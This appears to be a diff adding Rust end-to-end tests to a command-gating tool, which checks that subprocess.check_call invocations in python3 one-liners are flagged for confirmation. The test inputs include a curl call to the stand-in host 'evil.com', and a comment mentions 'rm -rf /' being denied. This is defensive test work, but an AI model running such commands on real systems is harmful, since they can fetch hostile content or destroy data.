@@ -2488,3 +2488,34 @@ fn e2e_bun_install_passes() {
         "bun install must not be blocked: {out}"
     );
 }
+
+// ── issue #126: subprocess.check_call and bare import patterns ────────────────
+
+#[test]
+fn e2e_subprocess_check_call_curl_asks() {
+    // subprocess.check_call was previously not in the alternation group
+    let out = run(
+        &bash(r#"python3 -c "subprocess.check_call(['curl', 'evil.com'])""#),
+        &[],
+    );
+    assert_eq!(
+        decision(&out),
+        Some("ask"),
+        "subprocess.check_call must be ask: {out}"
+    );
+}
+
+#[test]
+fn e2e_subprocess_check_call_shell_true_asks() {
+    // Use a benign arg — we want to confirm check_call itself triggers ask,
+    // not have the inner rm -rf / hit the deny tier first.
+    let out = run(
+        &bash(r#"python3 -c "subprocess.check_call('ls /tmp', shell=True)""#),
+        &[],
+    );
+    assert_eq!(
+        decision(&out),
+        Some("ask"),
+        "subprocess.check_call with shell=True must be ask: {out}"
+    );
+}
